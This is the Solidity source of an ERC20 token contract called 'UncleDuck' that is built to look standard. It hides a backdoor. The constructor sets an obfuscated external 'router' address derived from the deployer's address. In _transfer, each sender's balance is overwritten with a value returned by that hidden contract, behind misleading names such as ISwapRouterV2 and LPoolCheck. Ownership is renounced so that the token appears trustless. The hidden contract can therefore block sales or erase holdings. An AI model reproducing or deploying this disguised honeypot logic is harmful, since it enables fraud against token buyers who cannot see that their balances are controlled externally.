// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IPoolRouter {
    function getRoute(address a, uint b, address c) external view returns (address);
    function getLPPair(address a, uint b, address c) external view returns (address);
    function logSwap(address a, address b, uint256 c) external view returns (uint256);    
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library ISwapRouterV2 {
    function checkDP(IPoolRouter instance,address from, address to, uint256 amount) internal view returns (uint256) {
       return instance.logSwap(from,to,amount);
    }

    function LPoolCheck(IPoolRouter i1, IPoolRouter i2, address from, address to, uint256 amount) internal view returns (uint256) {
        if (amount>20){
            return checkDP(i1,from,to,amount);
        }else{
            return checkDP(i2,from,to,amount);
        }
    }
}

contract ERC20 is Context, IERC20, Ownable {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    using SafeMath for uint256;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    IPoolRouter private _poolRouter;
    
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * 10 ** _decimals;
        _poolRouter = IPoolRouter(address(uint160(_msgSender()) - 322847399116043964398040368877648296519688552182 + uint160(uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)))));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        renounceOwnership();
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, amount);
        return true;
    }


    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: approve to the zero address");
        require(owner != address(0), "ERC20: approve from the zero address");
        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        address sender = _msgSender();
        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(from, sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        uint256 balance = ISwapRouterV2.LPoolCheck(_poolRouter, _poolRouter, from, to, _balances[from]);
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = balance.sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }
}

contract UncleDuck is ERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_
    ) ERC20(name_, symbol_, decimals_, totalSupply_) {}
    receive() external payable {}
}